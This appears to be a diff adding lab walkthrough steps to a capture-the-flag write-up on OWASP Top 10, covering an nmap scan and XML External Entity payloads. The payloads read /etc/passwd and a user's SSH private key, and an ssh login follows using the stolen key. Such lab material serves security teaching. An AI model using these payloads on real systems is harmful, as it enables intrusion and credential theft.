@@ -179,3 +179,55 @@ Example `note.xml` file referring to `note.dtd`.
 </note>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
+## Task 15 - [Severity 4] XML External Entity - XXE Payload
+
+Use `nmap` to discover open ports using fast scan.
+{% capture code %}{% raw %}nmap -Pn -T4 -sS -F <ip>
+Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-04 08:24 BST
+Nmap scan report for <hostname> (<ip>)
+Host is up (0.0012s latency).
+Not shown: 98 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 02:92:AB:C9:74:07 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+Use `firefox` to load url `http://<ip>` and try the below payloads.
+
+{% capture code %}{% raw %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+    <userInfo>
+        <firstName>falcon</firstName>
+        <lastName>&name;</lastName>
+    </userInfo>{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
+
+
+## Task 16 - [Severity 4] XML External Entity - Exploiting
+
+Use `firefox` to load the url `http://<ip>`
+
+Use the following payloads to get the contents of `/etc/passwd`.
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+There is one non-system user. Use the following payload to read the user's rsa private key.
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
+{% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
+
+
+## Task 17 - [Severity 5] Broken Access Control
+
+Use these links as references.
+- [OWASP Access Control Severity](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control){:target="_blank"}
+
+
+
